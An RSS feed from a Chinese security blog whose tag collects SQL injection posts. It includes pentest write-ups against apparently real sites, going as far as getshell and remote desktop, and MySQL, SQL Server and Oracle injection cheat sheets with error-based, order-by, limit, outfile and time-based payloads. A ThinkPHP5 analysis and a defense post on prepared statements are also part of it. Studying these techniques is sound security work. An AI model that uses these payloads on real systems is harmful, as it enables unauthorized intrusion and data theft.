<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>SQL注入 on Reber's Blog</title><link>https://wyb0.com/tags/SQL%E6%B3%A8%E5%85%A5/</link><description>Recent content in SQL注入 on Reber's Blog</description><generator>Hugo</generator><language>en-us</language><lastBuildDate>Mon, 22 Jun 2020 17:35:07 +0000</lastBuildDate><atom:link href="https://wyb0.com/tags/SQL%E6%B3%A8%E5%85%A5/index.xml" rel="self" type="application/rss+xml"/><item><title>记一次 SQLServer 注入</title><link>https://wyb0.com/posts/2020/recording-sqlserver-injection/</link><pubDate>Mon, 22 Jun 2020 17:35:07 +0000</pubDate><guid>https://wyb0.com/posts/2020/recording-sqlserver-injection/</guid><description>&lt;h3 id="0x00-存在-sql-注入">0x00 存在 SQL 注入&lt;/h3>
&lt;p>总之是遇到一个站，登录的页面，数据包大致如下：&lt;/p>
&lt;pre tabindex="0">&lt;code>POST /jsweb/userlogin/UserLoginAction.aspx HTTP/1.1
Host: 115.xxx.xxx.xxx:8042
Content-Length: 47
Accept: */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://115.xxx.xxx.xxx:8042
Referer: http://115.xxx.xxx.xxx:8042/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: ASP.NET_SessionId=bxdzehxa5mvoco1fkrjlbqbt
Connection: close

uname=admin*&amp;amp;pwd=dskfsdkf&amp;amp;valCode=1197&amp;amp;telphone=
&lt;/code>&lt;/pre>&lt;p>其中验证码可以绕过，而登录名那里存在注入
&lt;img src="https://wyb0.com/img/post/Xnip2020-09-13_22-20-51.jpg" alt="">
&lt;img src="https://wyb0.com/img/post/Xnip2020-09-13_22-21-32.jpg" alt="">&lt;/p></description></item><item><title>通过 selenium 和 flask 中转后利用 sqlmap 进行注入</title><link>https://wyb0.com/posts/2019/after-transit-via-selenium-flask-to-use-sqlmap/</link><pubDate>Sat, 27 Jul 2019 18:15:25 +0000</pubDate><guid>https://wyb0.com/posts/2019/after-transit-via-selenium-flask-to-use-sqlmap/</guid><description>&lt;h3 id="0x00-先说前提">0x00 先说前提&lt;/h3>
&lt;p>昨天某个小伙伴说有个注入没法搞
&lt;img src="https://wyb0.com/img/post/Xnip2019-07-27_19-20-07.png" alt="60">&lt;/p>
&lt;p>前端提交登陆表单时数据包加密了, 而且有个 sign 字符串每次都不一样用于校验, 应该是用 js 加密了
&lt;img src="https://wyb0.com/img/post/Xnip2019-07-27_18-40-20.png" alt="">
&lt;img src="https://wyb0.com/img/post/Xnip2019-07-27_18-41-18.png" alt="">&lt;/p></description></item><item><title>从 SQL Server 注入到 远程连接桌面</title><link>https://wyb0.com/posts/2019/sql-server-from-sql-injection-to-remote-conn-desktop/</link><pubDate>Tue, 25 Jun 2019 17:01:53 +0000</pubDate><guid>https://wyb0.com/posts/2019/sql-server-from-sql-injection-to-remote-conn-desktop/</guid><description>&lt;h3 id="0x00-目标情况">0x00 目标情况&lt;/h3>
&lt;ul>
&lt;li>只有一个登录框&lt;/li>
&lt;/ul>
&lt;h3 id="0x01-发现注入">0x01 发现注入&lt;/h3>
&lt;p>简单看了下登陆框，可以爆破用户名&lt;/p>
&lt;p>&lt;img src="https://wyb0.com/img/post/Xnip2019-06-25_09-42-33.png" alt="50">
&lt;img src="https://wyb0.com/img/post/Xnip2019-06-25_09-43-33.png" alt="50">&lt;/p>
&lt;p>加单引号后报错，试了试 and 1=1 确实存在注入&lt;/p>
&lt;p>&lt;img src="https://wyb0.com/img/post/Xnip2019-06-25_09-45-03.png" alt="60">
&lt;img src="https://wyb0.com/img/post/Xnip2019-06-25_09-46-06.png" alt="50">&lt;/p>
&lt;h3 id="0x01-进一步测试">0x01 进一步测试&lt;/h3>
&lt;p>尝试得到数据版本: &lt;code>admin' and @@version=1--&lt;/code>
&lt;img src="https://wyb0.com/img/post/Xnip2019-06-25_09-49-45.png" alt="60">&lt;/p></description></item><item><title>从 SQL Server 注入到 getshell</title><link>https://wyb0.com/posts/2019/sql-server-from-injection-to-getshell/</link><pubDate>Sat, 02 Mar 2019 20:23:35 +0000</pubDate><guid>https://wyb0.com/posts/2019/sql-server-from-injection-to-getshell/</guid><description>&lt;h3 id="0x00-目标情况">0x00 目标情况&lt;/h3>
&lt;ul>
&lt;li>一个web站点111.*.*.63，只有一个登陆框，测试了没有注入，没有弱口令&lt;/li>
&lt;li>扫描了全端口，没有发现什么有用的信息&lt;/li>
&lt;/ul>
&lt;h3 id="0x01-发现注入">0x01 发现注入&lt;/h3>
&lt;p>当时是查看网页源代码，有两个可疑接口，一个是初始化密码借口，访问返回空白页面，没有什么用&lt;/p></description></item><item><title>SQL注入 tips(Oracle)</title><link>https://wyb0.com/posts/2019/injection-tips-of-oracle/</link><pubDate>Fri, 04 Jan 2019 20:23:35 +0000</pubDate><guid>https://wyb0.com/posts/2019/injection-tips-of-oracle/</guid><description>&lt;h3 id="0x00-判断数据库类型">0x00 判断数据库类型&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>Oracle有一些自带的表：dual、user_tables&lt;/p>
&lt;ul>
&lt;li>&lt;code>id=45 and (select count(*) from user_tables)&amp;gt;0--&lt;/code>&lt;/li>
&lt;li>&lt;code>id=45 and (select count(*) from dual)&amp;gt;0--&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>利用自带的一些函数：譬如utl_http.request 这些&lt;/p></description></item><item><title>记一次 SQL Server 报错注入</title><link>https://wyb0.com/posts/2018/recording-an-sqlserver-sql-injection-of-error-based/</link><pubDate>Mon, 24 Dec 2018 10:51:02 +0000</pubDate><guid>https://wyb0.com/posts/2018/recording-an-sqlserver-sql-injection-of-error-based/</guid><description>&lt;h3 id="0x00-验证码前端验证">0x00 验证码前端验证&lt;/h3>
&lt;p>需要测试一个网站，刚开始看到网站时感觉希望不大，因为验证码是需要拖动的，这也就意味着很大可能没办法爆破，另一方面是都用这种验证码了，安全做的能很差劲吗？果然，试了admin、123456之类的都不行
&lt;img src="https://wyb0.com/img/post/20181224-200518.png" alt="40">&lt;/p></description></item><item><title>SQL注入 tips(SQL Server)</title><link>https://wyb0.com/posts/2018/injection-tips-of-sqlserver/</link><pubDate>Tue, 04 Sep 2018 10:09:17 +0000</pubDate><guid>https://wyb0.com/posts/2018/injection-tips-of-sqlserver/</guid><description>&lt;h3 id="0x00-基础信息探测">0x00 基础信息探测&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sql" data-lang="sql">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">@@&lt;/span>&lt;span style="color:#66d9ef">VERSION&lt;/span>,&lt;span style="color:#f92672">@@&lt;/span>SERVERNAME,&lt;span style="color:#f92672">@@&lt;/span>SERVICENAME;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">--Microsoft SQL Server 2008 (RTM) - 10.0.1600.22 (X64) 
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">--WIN-2008
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">--MSSQLSERVER
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">USER&lt;/span>,&lt;span style="color:#66d9ef">CURRENT_USER&lt;/span>,&lt;span style="color:#66d9ef">SESSION_USER&lt;/span>,&lt;span style="color:#66d9ef">SYSTEM_USER&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">--dbo
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">--dbo
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">--dbo
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">--sa
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>USER_NAME(),HOST_NAME(),HOST_ID(),SUSER_NAME();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">--dbo
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">--wyb
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">--46530
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">--sa
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>USER_ID(),USER_SID();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">--1
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">--&amp;lt;01&amp;gt;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ORIGINAL_LOGIN();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">--sa
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="0x01-union-query--error-based-注入">0x01 UNION query &amp;amp; error-based 注入&lt;/h3>
&lt;ul>
&lt;li>判断存在注入&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>and 1=1/and 1=2
&lt;/code>&lt;/pre>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sql" data-lang="sql">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">select&lt;/span> &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#66d9ef">from&lt;/span> msg &lt;span style="color:#66d9ef">where&lt;/span> id&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#66d9ef">and&lt;/span> &lt;span style="color:#ae81ff">11&lt;/span>&lt;span style="color:#f92672">=&lt;/span>(&lt;span style="color:#66d9ef">select&lt;/span> &lt;span style="color:#66d9ef">case&lt;/span> &lt;span style="color:#66d9ef">when&lt;/span>(&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>) &lt;span style="color:#66d9ef">then&lt;/span> &lt;span style="color:#ae81ff">11&lt;/span> &lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#66d9ef">end&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">select&lt;/span> &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#66d9ef">from&lt;/span> msg &lt;span style="color:#66d9ef">where&lt;/span> id&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#66d9ef">and&lt;/span> &lt;span style="color:#ae81ff">11&lt;/span>&lt;span style="color:#f92672">=&lt;/span>(&lt;span style="color:#66d9ef">select&lt;/span> &lt;span style="color:#66d9ef">case&lt;/span> &lt;span style="color:#66d9ef">when&lt;/span>(&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>) &lt;span style="color:#66d9ef">then&lt;/span> &lt;span style="color:#ae81ff">11&lt;/span> &lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#66d9ef">end&lt;/span>);
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>判断是否为sa权限&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sql" data-lang="sql">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">select&lt;/span> name &lt;span style="color:#66d9ef">from&lt;/span> msg &lt;span style="color:#66d9ef">where&lt;/span> id&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#66d9ef">and&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#66d9ef">convert&lt;/span>(int,(&lt;span style="color:#66d9ef">select&lt;/span> is_srvrolemember(&lt;span style="color:#e6db74">&amp;#39;sysadmin&amp;#39;&lt;/span>)));
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://wyb0.com/img/post/20180904-105516.png" alt="55">&lt;/p></description></item><item><title>SQL注入 tips(MySQL)</title><link>https://wyb0.com/posts/2018/injection-tips-of-mysql/</link><pubDate>Wed, 23 May 2018 11:14:51 +0000</pubDate><guid>https://wyb0.com/posts/2018/injection-tips-of-mysql/</guid><description>&lt;p>环境：MySQL 5.5.47&lt;/p>
&lt;h3 id="0x00-注入点在order-by后面">0x00 注入点在Order by后面&lt;/h3>
&lt;pre tabindex="0">&lt;code>mysql&amp;gt; select id,name,content from msg where id&amp;gt;1 order by id into outfile &amp;#39;C:\\Apps\\phpStudy\\WWW\\a.txt&amp;#39;;
Query OK, 1 row affected (0.01 sec)
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>mysql&amp;gt; select id,name,content from msg where id&amp;gt;1 order by updatexml(0,concat(0x7e,(SELECT concat(table_name) FROM information_schema.tables WHERE table_schema=database() limit 0,1),0x7e),1);
ERROR 1105 (HY000): XPATH syntax error: &amp;#39;~msg~&amp;#39;
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>mysql&amp;gt; select id,name,content from msg where id&amp;gt;1 order by name procedure analyse(updatexml(1,concat(0x7e,database(),0x7e),1),1);
ERROR 1105 (HY000): XPATH syntax error: &amp;#39;~rtest~&amp;#39;
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>mysql&amp;gt; select name from msg where id&amp;gt;1 order by if(1=1,1,(select 1 union select 2));
+----------+
| name |
+----------+
| xiaohong |
+----------+
1 row in set (0.00 sec)
mysql&amp;gt; select name from msg where id&amp;gt;1 order by if(1=2,1,(select 1 union select 2));
ERROR 1242 (21000): Subquery returns more than 1 row

mysql&amp;gt; select name from msg where id&amp;gt;1 order by (select case when(2&amp;gt;1) then 1 else 1*(select 1 union select 2)end)=1;
+----------+
| name |
+----------+
| xiaohong |
+----------+
1 row in set (0.00 sec)
mysql&amp;gt; select name from msg where id&amp;gt;1 order by (select case when(2&amp;lt;1) then 1 else 1*(select 1 union select 2)end)=1;
ERROR 1242 (21000): Subquery returns more than 1 row
&lt;/code>&lt;/pre>&lt;h3 id="0x01-注入点在limit后面">0x01 注入点在limit后面&lt;/h3>
&lt;ul>
&lt;li>limit前面没有order by可以使用union、analyse()&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>mysql&amp;gt; select id,name,content from msg where id&amp;gt;1 limit 1,1 union select 1,2,3;
+----+------+---------+
| id | name | content |
+----+------+---------+
| 1 | 2 | 3 |
+----+------+---------+
1 row in set (0.01 sec)

mysql&amp;gt; select id,name,content from msg where id&amp;gt;1 limit 1,1 procedure analyse();
+-------------------+---------------+---------------+------------+------------+
| Field_name | Min_value | Max_value | Min_length | Max_length |
+-------------------+---------------+---------------+------------+------------+
| rtest.msg.name | xiaohong | xiaohong | 8 | 8 |
| rtest.msg.content | I have a cat. | I have a cat. | 13 | 13 |
+-------------------+---------------+---------------+------------+------------+

------------------+-------+-------------------------+------+--------------------+
 Empties_or_zeros | Nulls | Avg_value_or_avg_length | Std | Optimal_fieldtype |
------------------+-------+-------------------------+------+--------------------+
 0 | 0 | 8.0000 | NULL | ENUM(&amp;#39;xiaohong&amp;#39;) NOT NULL |
 0 | 0 | 13.0000 | NULL | ENUM(&amp;#39;I have a cat.&amp;#39;) NOT NULL|
------------------+-------+-------------------------+------+--------------------+
2 rows in set (0.00 sec)
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>limit前面有order by则不可以使用union、analyse()&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>mysql&amp;gt; select id,name,content from msg where id&amp;gt;1 limit 1,1 procedure analyse(updatexml(1,concat(0x7e,@@version,0x7e),1),1);
ERROR 1105 (HY000): XPATH syntax error: &amp;#39;~5.5.47~&amp;#39;

mysql&amp;gt; select id,name,content from msg where id&amp;gt;1 order by name limit 1,1 procedure analyse(updatexml(1,concat(0x7e,@@version,0x7e),1),1);
ERROR 1105 (HY000): XPATH syntax error: &amp;#39;~5.5.47~&amp;#39;
&lt;/code>&lt;/pre>&lt;h3 id="0x02-根据报错得到数据库名表名列名">0x02 根据报错得到数据库名、表名、列名&lt;/h3>
&lt;pre tabindex="0">&lt;code>#得到数据库名为rtest
mysql&amp;gt; select id,name,content from msg where id=2-a();
ERROR 1305 (42000): FUNCTION rtest.a does not exist

#得到表名为msg
mysql&amp;gt; select id,name,content from msg where id=2 and polygon(1);
ERROR 1367 (22007): Illegal non geometric &amp;#39;1&amp;#39; value found during parsing
mysql&amp;gt; select id,name,content from msg where id=2 and polygon(id);
ERROR 1367 (22007): Illegal non geometric &amp;#39;`rtest`.`msg`.`id`&amp;#39; value found during parsing

#得到列名为id、name、content、useragent
mysql&amp;gt; select id,name,content from msg where id=2 and (select * from(select * from msg as a join msg as b)c);
ERROR 1060 (42S21): Duplicate column name &amp;#39;id&amp;#39;
mysql&amp;gt; select id,name,content from msg where id=2 and (select * from(select * from msg as a join msg as b using(id))c);
ERROR 1060 (42S21): Duplicate column name &amp;#39;name&amp;#39;
mysql&amp;gt; select id,name,content from msg where id=2 and (select * from(select * from msg as a join msg as b using(id,name))c);
ERROR 1060 (42S21): Duplicate column name &amp;#39;content&amp;#39;
mysql&amp;gt; select id,name,content from msg where id=2 and (select * from(select * from msg as a join msg as b using(id,name,content))c);
ERROR 1060 (42S21): Duplicate column name &amp;#39;useragent&amp;#39;
mysql&amp;gt; select id,name,content from msg where id=2 and (select * from(select * from msg as a join msg as b using(id,name,content,useragent))c);
ERROR 1241 (21000): Operand should contain 1 column(s)
&lt;/code>&lt;/pre>&lt;h3 id="0x03-mysql的隐式转换">0x03 MySQL的隐式转换&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>官方隐式转换规则&lt;/p></description></item><item><title>ThinkPHP5 的 where 函数使用不当存在注入</title><link>https://wyb0.com/posts/2018/thinkphp5-where-function/</link><pubDate>Mon, 16 Apr 2018 19:16:14 +0000</pubDate><guid>https://wyb0.com/posts/2018/thinkphp5-where-function/</guid><description>&lt;h3 id="0x00-关于thinkphp5的where函数">0x00 关于thinkphp5的where函数&lt;/h3>
&lt;p>年前公司委托别的公司开发一个网站，使用的是ThinkPHP 5.0.13，存在一个注入漏洞，分析后发现是因为tp5中的where函数使用不当，tp5中where这个函数可以接收字符串和数组这两种类型的参数来进行查询，而在用字符串这种传递方式时，如果使用不当的话就可能会出现sql注入。&lt;/p></description></item><item><title>[转] MySQL 报错注入原理分析(count()、rand()、group by)</title><link>https://wyb0.com/posts/2016/mysql-injection-error-based-theory-count-rand-groupby/</link><pubDate>Sun, 13 Nov 2016 11:59:26 +0000</pubDate><guid>https://wyb0.com/posts/2016/mysql-injection-error-based-theory-count-rand-groupby/</guid><description>&lt;p>原文链接：&lt;a href="http://drops.wooyun.org/tips/14312?_blank">http://drops.wooyun.org/tips/14312&lt;/a>&lt;/p>
&lt;h3 id="0x00-疑问">0x00 疑问&lt;/h3>
&lt;p>一直在用mysql数据库报错注入方法，但为何会报错？&lt;/p>
&lt;p>&lt;img src="https://wyb0.com/img/post/wooyun-drops-tips-14312-1.jpg" alt="">&lt;/p>
&lt;p>百度谷歌知乎了一番，发现大家都是把官网的结论发一下截图，然后执行sql语句证明一下结论，但是没有人去深入研究为什么rand不能和order by一起使用，也没彻底说明三者同时使用报错的原理。&lt;/p></description></item><item><title>SQL 注入之防御</title><link>https://wyb0.com/posts/2016/injection-of-defense/</link><pubDate>Sat, 25 Jun 2016 10:25:11 +0000</pubDate><guid>https://wyb0.com/posts/2016/injection-of-defense/</guid><description>&lt;h3 id="0x00-要做的事">0x00 要做的事&lt;/h3>
&lt;p>也就是找到注入点然后修复&lt;/p>
&lt;h3 id="0x01-防御方法">0x01 防御方法&lt;/h3>
&lt;ul>
&lt;li>使用预编译语句绑定变量(比如php的mysqli、pdo)&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#a6e22e">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">//预编译
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> $mysqli &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> &lt;span style="color:#a6e22e">mysqli&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;localhost&amp;#34;&lt;/span>,&lt;span style="color:#e6db74">&amp;#34;root&amp;#34;&lt;/span>,&lt;span style="color:#e6db74">&amp;#34;123456&amp;#34;&lt;/span>,&lt;span style="color:#e6db74">&amp;#34;share&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $mysqli&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#a6e22e">query&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;set names utf8&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $sql &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;INSERT INTO test (name,sex,age) VALUE(?,?,?)&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $s &lt;span style="color:#f92672">=&lt;/span> $mysqli&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#a6e22e">prepare&lt;/span>($sql);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">//绑定参数
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> $name &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;Tom&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $sex &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;M&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $age &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">23&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $s&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#a6e22e">bind_param&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;ssi&amp;#34;&lt;/span>,$name,$sex,$age);&lt;span style="color:#75715e">//ssi的意思是字符、字符、整型
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">//执行
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> $result &lt;span style="color:#f92672">=&lt;/span> $s&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#a6e22e">execute&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">var_dump&lt;/span>($result);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $s&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#a6e22e">close&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>使用存储过程(这里以SQLServer举例)&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>--如果存在名为get_student_msg(相当于函数)的存储过程则删除
IF EXISTS (SELECT name FROM sysobjects WHERE name=&amp;#39;get_student_msg&amp;#39; AND type=&amp;#39;p&amp;#39;)
 DROP PROCEDURE get_student_msg

CREATE PROCEDURE get_student_msg --创建存储过程
 @name VARCHAR(20) --声明全局变量
AS
 BEGIN
 SELECT * from info
 WHERE name=@name
 END
GO

--创建好存储过程后在其他地方直接使用函数并传参就行了
EXEC get_student_msg &amp;#39;xiaoli&amp;#39;
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>使用转义函数&lt;br>
如：addslashes()和mysql_real_escape_string()&lt;br>
在php.ini设置auto_prepend_file自动在脚本执行前在首部加载文件&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#a6e22e">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">//简单过滤
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> $filter &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">array&lt;/span>(&lt;span style="color:#f92672">&amp;amp;&lt;/span>$_GET,&lt;span style="color:#f92672">&amp;amp;&lt;/span>$_POST,&lt;span style="color:#f92672">&amp;amp;&lt;/span>$_COOKIE);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">foreach&lt;/span> ($filter &lt;span style="color:#66d9ef">as&lt;/span> $key &lt;span style="color:#f92672">=&amp;gt;&lt;/span> $value){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">foreach&lt;/span> ($value &lt;span style="color:#66d9ef">as&lt;/span> $k &lt;span style="color:#f92672">=&amp;gt;&lt;/span> $v){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $filter[$key][$k] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">mysql_real_escape_string&lt;/span>($v);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>
&lt;p>检查数据类型&lt;/p></description></item><item><title>SQL 注入之宽字节注入(MySQL)</title><link>https://wyb0.com/posts/2016/injection-of-wide-byte/</link><pubDate>Fri, 24 Jun 2016 15:32:34 +0000</pubDate><guid>https://wyb0.com/posts/2016/injection-of-wide-byte/</guid><description>&lt;h3 id="0x00-应用场景">0x00 应用场景&lt;/h3>
&lt;p>在注入时通常会使用单引号、双引号等特殊字符。在应用中，通常为了安全，开发者会开启php的magic_quotes_gpc，或者使用addslashes、mysql_real_escape_string等函数对客户端传入的参数进行过滤，则注入的单引号或双引号就会被&lt;code>&amp;quot;\&amp;quot;&lt;/code>转义，但是，如果服务端的数据库使用的是GB2312、GBK、GB18030等宽字节的编码时，则依然会造成注入。&lt;/p></description></item><item><title>SQL 注入之基于时间的注入(MySQL)</title><link>https://wyb0.com/posts/2016/injection-of-time-based/</link><pubDate>Fri, 24 Jun 2016 10:10:27 +0000</pubDate><guid>https://wyb0.com/posts/2016/injection-of-time-based/</guid><description>&lt;h3 id="0x00-特点">0x00 特点&lt;/h3>
&lt;pre tabindex="0">&lt;code>当页面存在注入，但是没有显示位且不管怎么测试返回页面都没有变化，此时可以使用基于时间的盲注进行注入。
其实只要存在SQL注入就可以使用基于时间的盲注，利用范围比较广泛，但是可能受到网络带宽等因素的影响。
&lt;/code>&lt;/pre>&lt;h3 id="0x01-利用方式">0x01 利用方式&lt;/h3>
&lt;pre tabindex="0">&lt;code>整型注入的话可以直接: ?id=if(1=1,sleep(2),1)
